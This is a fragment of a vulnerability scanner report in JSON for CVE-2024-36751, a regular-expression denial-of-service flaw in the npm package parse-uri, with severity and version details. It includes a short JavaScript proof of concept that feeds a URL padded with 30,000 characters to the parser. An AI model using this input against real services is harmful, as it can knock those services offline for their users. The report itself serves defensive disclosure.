            {
              "id": "CVE-2024-36751",
              "name": "OsPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2024-36751: Inefficient Regular Expression Complexity"
              },
              "helpUri": "https://scout.docker.com/v/CVE-2024-36751?s=github&n=parseuri&t=npm&vr=%3C2.0.0",
              "help": {
                "text": "An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.\n ## PoC\n```js\nasync function exploit() {\n    const parseuri = require(\"parse-uri\");\n    // This input is designed to cause excessive backtracking in the regex\n    const craftedInput = 'http://example.com/' + 'a'.repeat(30000) + '?key=value';\n    const result = await parseuri(craftedInput);\n    }\nawait exploit();\n```\n",
                "markdown": "> An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.\n ## PoC\n```js\nasync function exploit() {\n    const parseuri = require(\"parse-uri\");\n    // This input is designed to cause excessive backtracking in the regex\n    const craftedInput = 'http://example.com/' + 'a'.repeat(30000) + '?key=value';\n    const result = await parseuri(craftedInput);\n    }\nawait exploit();\n```\n\n|                                                                                                                          |\n|Package                                                                                           pkg:npm/parseuri@0.0.6  |\n|Affected range                                                                                    <2.0.0                  |\n|Fixed version                                                                                     not fixed               |\n|[[CVSS Score 6.9] [CVSS Vector CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N]]                          |\n"
              },
